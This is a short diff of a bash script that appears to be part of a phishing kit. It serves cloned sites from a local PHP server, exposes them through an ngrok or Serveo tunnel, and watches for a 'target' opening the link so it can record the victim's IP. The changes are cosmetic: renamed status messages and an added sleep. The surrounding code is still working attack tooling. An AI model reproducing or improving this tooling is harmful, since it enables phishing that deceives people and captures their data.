@@ -316,7 +316,7 @@ serverx() {
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Serveo...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "Error, openssh is not installed! Aborting..."; exit 1; }
 if [[ -e sendlink ]]; then
 rm -rf sendlink
@@ -368,7 +368,7 @@ sleep 0
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading ngrok...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -401,7 +401,7 @@ fi
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting Ngrok...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
@@ -441,6 +441,7 @@ while [ true ]; do
 
 if [[ -e "sites/$server/ip.txt" ]]; then
 printf "\e[1;92m[\e[0m*\e[1;92m] Target opened the link!\n"
+sleep 1
 printf "\e[1;92m[\e[0m*\e[1;92m] IP found!\n"
 catch_ip
 rm -rf sites/$server/ip.txt
